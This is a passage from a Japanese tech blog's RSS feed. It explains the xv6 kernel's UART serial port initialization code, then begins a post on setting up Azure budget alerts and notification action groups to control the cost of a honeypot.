&lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;115200&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;9600&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x03&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// Lock divisor, 8 data bits.&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// Enable receive interrupts.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;COM1+3&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;Line control register&lt;/code&gt;に該当します。&lt;/p&gt;
&lt;p&gt;これは、セットされたbitに応じて通信パラメータを変更します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 428px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/71dfa1e3f1bdd7ff90d7dd26a33318b1/47730/image-54.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 102.08333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAAD5UlEQVQ4y2VUW2/bZBjO30RCQ0jco0kIiRu4KFRC4gaBEFyAgNttQqDCurVdS8fSdlm7tEua2LFzsJ2D48RnO+c8PO+XjRU10asvtuP3e97n8BW2fj3C3W928OHXO/jgy9/w0Xe7+OynPby/fQ8ff/8Yn/zwCJ/+uIetX57g7rd/4d3P7+HO9gPc+eJtvbd9H+9sPcBXP++gMBwFMBs6vOEQSRSiaZqoVF5Ba9SRJjE0rYa6Voemy3WC6STDJM8wvVGTPMV8PsPZ+SUKozAFsOYXyLMMQza2LAtDz8NiPke366Db66I/6GGxWGK1Wt2q5XIJ+ZTKFRQcd4yESJI0Vc00TUO1ckWEDURRhFq9hur1tUIZhCHiOL5V8r80y3FSKqPgKYTAar1WCF13CMe2MBqPOd4EtmPDJkqH65yIBc3tWrxF2PdCxV/GZr4/VhxWqxWO2VfIDV6bpgGLDSeTKWtyq9I0Qc5npy/IoTuOEBPyZDpVpA/6fYUmCEL+OUen04FpNGDbDjcM4A5dUiPlYTwawfOGfHcGDoiziysUgmSCN5/5bIYxRxXEKTldLBZs2CZqA7quod22YNk2DMNU3Oq6rjj3KGBELs8vayh0ui503hTuItqm2+2qsce+D5/NDYojLwlCIT+OYoV0THqkkeeNFGI/CDYj94Y+hq6LmOPKyLXrqmogiibctdVqoU0buUQtiGecYrGYq98ihqxSYrvnF6/IoR9jvVqqm1EY4LJcRqNhYER+ojBCkw3NZhOtdhtT8ixKy3qzRJg5Pao47HuBcn7Om6KyNBSEYuwRCZeRTaPJe7raRGhIkhR5nitnvKkpkZ9KUryAPlyL21f0YY4GFRVlhYI8S+FYNnq0UH/QR4/8tolY7CMJ2Yy9mU758CV92JWkxJFS1SWXV1fMMRV0+PKIKEXJWq3Ojag0UWq8DknF/9MSEeXrpPhxTj95KikpH4rCfXpRbJBxE9NsEmGPlmmrTDdbwmdL8bbmOzez/KJcZZYHY3ZPyUtCDn2FSJoOiFb8WK/X2XTjuyYbabUaJ9BU9uW9VK2ZoqFYesnTJsqoZsid1qqhwdFsmtdnUlKSr+uGokLEGZDHDjm0HIcnUoeTDBS3DT7r08fnl9dUeRS+Ps/mmyw3TVgURRITcyNRVxo5dkdFUpLT6bTUKnZq8LwUg89mc6pM21T1Np6dXSi4x8USHh8+xd7hPzh69hzHJyXsHhzjydNTHBwXsf93EQ/3j/Bw71Ctf+we4Pc/H/H5CfaPiup/BZFcFMroqzyf0KgzdVCIL/+7VqfMVP3uUbAuRZKISoIs2qpJpJVKldGM8S+pabx/t0/rAgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/71dfa1e3f1bdd7ff90d7dd26a33318b1/8ac56/image-54.webp 240w,
/static/71dfa1e3f1bdd7ff90d7dd26a33318b1/3b73a/image-54.webp 428w&quot;
              sizes=&quot;(max-width: 428px) 100vw, 428px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/71dfa1e3f1bdd7ff90d7dd26a33318b1/8ff5a/image-54.png 240w,
/static/71dfa1e3f1bdd7ff90d7dd26a33318b1/47730/image-54.png 428w&quot;
            sizes=&quot;(max-width: 428px) 100vw, 428px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/71dfa1e3f1bdd7ff90d7dd26a33318b1/47730/image-54.png&quot;
            alt=&quot;2022/02/image-54.png&quot;
            title=&quot;2022/02/image-54.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://www.lammertbies.nl/comm/info/serial-uart&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Serial UART, an in depth tutorial - Lammert Bies&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;outb(COM1+3, 0x80);&lt;/code&gt;は8bit目をセットして&lt;code class=&quot;language-text&quot;&gt;DLAB&lt;/code&gt;を有効化しています。&lt;/p&gt;
&lt;p&gt;これによって、次の&lt;code class=&quot;language-text&quot;&gt;COM1+0&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;COM1+1&lt;/code&gt;への書き込みアクセスが&lt;code class=&quot;language-text&quot;&gt;Divisor latch registers (R/W)&lt;/code&gt;に変化します。&lt;/p&gt;
&lt;p&gt;ここに&lt;code class=&quot;language-text&quot;&gt;115200/9600&lt;/code&gt;と0をそれぞれ書き込むことでUARTのタイムベースを9,600bpsに設定していることになります。&lt;/p&gt;
&lt;p&gt;続く&lt;code class=&quot;language-text&quot;&gt;outb(COM1+3, 0x03);&lt;/code&gt;では、LRCの&lt;code class=&quot;language-text&quot;&gt;DLAB&lt;/code&gt;を解除するとともに&lt;code class=&quot;language-text&quot;&gt;8 data bits&lt;/code&gt;をセットしています。&lt;/p&gt;
&lt;p&gt;その後、&lt;code class=&quot;language-text&quot;&gt;Modem control register&lt;/code&gt;に0をセットした後、割込みを有効化してます。&lt;/p&gt;
&lt;p&gt;一通りの初期化処理を行った後、&lt;code class=&quot;language-text&quot;&gt;Line status register&lt;/code&gt;のチェックを行ってシリアルポートが利用可能であることを確認しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// If status is 0xFF, no serial port.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;inb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
uart &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最後に、RBRとIIRの情報を参照して現在の割込み状態を確認した後、割込みを有効化して終了です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Acknowledge pre-existing interrupt conditions;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// enable interrupts.&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;inb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;inb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;COM1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;ioapicenable&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;IRQ_COM1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;今回はシリアルポートの初期化処理を追いかけてました。&lt;/p&gt;
&lt;p&gt;次回は&lt;code class=&quot;language-text&quot;&gt;pinit&lt;/code&gt;関数です。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qZSCY7&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;30日でできる! OS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qXYsZX&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ゼロからのOS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3I6fkVt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解 Linuxカーネル&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3JRUdI2&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;作って理解するOS x86系コンピュータを動かす理論と実装&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Azure Active Directory の ID セキュリティスコアを確認してみる]]></title><link>https://kashiwaba-yuki.com/azure-setup-on-money</link><guid isPermaLink="false">https://kashiwaba-yuki.com/azure-setup-on-money</guid><pubDate>Sat, 12 Feb 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;先日&lt;a href=&quot;/honeypot-setup-on-azure&quot;&gt;こちらの記事&lt;/a&gt;で、Azureにハニーポットを構築するする手順についてまとめましたが、実際に運用するにあたって気になるのはコストの問題ですよね。&lt;/p&gt;
&lt;p&gt;今回はAzureのコストのアラート設定を行って、予算オーバーな運用にならないように通知を実装していきたいと思います。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B3%E3%82%B9%E3%83%88%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B3%E3%81%A4%E3%81%AE%E3%82%A2%E3%83%A9%E3%83%BC%E3%83%88%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;コストに関する3つのアラートについて&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E4%BA%88%E7%AE%97%E3%82%A2%E3%83%A9%E3%83%BC%E3%83%88%E3%81%AE%E4%BD%9C%E6%88%90&quot;&gt;予算アラートの作成&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E9%80%9A%E7%9F%A5%E3%81%AE%E3%82%A2%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%B0%E3%83%AB%E3%83%BC%E3%83%97%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B&quot;&gt;通知のアクショングループを作成する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BA%88%E7%AE%97%E3%82%A2%E3%83%A9%E3%83%BC%E3%83%88%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B&quot;&gt;予算アラートを作成する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%81%8A%E3%81%BE%E3%81%91azure-function-%E3%81%A7-discord-%E3%81%AB%E9%80%9A%E7%9F%A5%E3%82%92%E8%BB%A2%E9%80%81%E3%81%99%E3%82%8B&quot;&gt;おまけ：Azure Function で Discord に通知を転送する&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E9%96%8B%E7%99%BA%E7%92%B0%E5%A2%83%E3%82%92%E6%A7%8B%E7%AF%89%E3%81%99%E3%82%8B&quot;&gt;開発環境を構築する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%87%E3%83%97%E3%83%AD%E3%82%A4%E3%81%99%E3%82%8B&quot;&gt;デプロイする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%A2%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%B0%E3%83%AB%E3%83%BC%E3%83%97%E3%81%8B%E3%82%89function%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B&quot;&gt;アクショングループからFunctionを実行する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;コストに関する3つのアラートについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B3%E3%82%B9%E3%83%88%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B3%E3%81%A4%E3%81%AE%E3%82%A2%E3%83%A9%E3%83%BC%E3%83%88%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;コストに関する3つのアラートについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;コストに関する3つのアラートについて&lt;/h2&gt;
&lt;p&gt;Azureのコストアラートについて調べてみたところ、以下の3つのアラートが存在するようでした。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/cost-management-billing/costs/cost-mgt-alerts-monitor-usage-spending?WT.mc_id=Portal-Microsoft_Azure_CostManagement#budget-alerts&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;予算アラート&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/cost-management-billing/costs/cost-mgt-alerts-monitor-usage-spending?WT.mc_id=Portal-Microsoft_Azure_CostManagement#credit-alerts&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;クレジットアラート&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/cost-management-billing/costs/cost-mgt-alerts-monitor-usage-spending?WT.mc_id=Portal-Microsoft_Azure_CostManagement#department-spending-quota-alerts&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;部署課金クォータアラート&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/cost-management-billing/costs/cost-mgt-alerts-monitor-usage-spending?WT.mc_id=Portal-Microsoft_Azure_CostManagement&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Azure Cost Management のコストのアラートで使用量と支出を監視する | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;「予算アラート」は、事前に設定した予算アラートの値に到達、もしくは超過した場合に発生するアラートです。&lt;/p&gt;
&lt;p&gt;この「予算アラート」では、以下の2つの条件がサポートされています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;コストベース&lt;/li&gt;
&lt;li&gt;使用量ベース&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;「クレジットアラート」と「部署課金クォータアラート」はどちらも法人組織向けのアラートなので、今回は「予算アラート」を使用していきます。&lt;/p&gt;
&lt;h2 id=&quot;予算アラートの作成&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BA%88%E7%AE%97%E3%82%A2%E3%83%A9%E3%83%BC%E3%83%88%E3%81%AE%E4%BD%9C%E6%88%90&quot; aria-label=&quot;予算アラートの作成 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;予算アラートの作成&lt;/h2&gt;
&lt;p&gt;以下のドキュメントを参考にしつつ、Azureポータルから「予算アラート」を設定していきます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/cost-management-billing/costs/tutorial-acm-create-budgets&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;チュートリアル - Azure の予算を作成して管理する | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;実際にアラートを作成する前に、通知先を制御できるアクショングループを作成することにします。&lt;/p&gt;
&lt;h3 id=&quot;通知のアクショングループを作成する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E9%80%9A%E7%9F%A5%E3%81%AE%E3%82%A2%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%B0%E3%83%AB%E3%83%BC%E3%83%97%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;通知のアクショングループを作成する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;通知のアクショングループを作成する&lt;/h3&gt;
&lt;p&gt;Azureのアクショングループは通知設定を管理できます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/azure-monitor/alerts/action-groups&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Azure Portal でのアクション グループの作成および管理 - Azure Monitor | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今回はSMS、メール通知、Azuerアプリへの通知を行うアクショングループを作成しました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 675px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/b7b89a2236b94726246b7d066f36df2e/23296/image-43.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
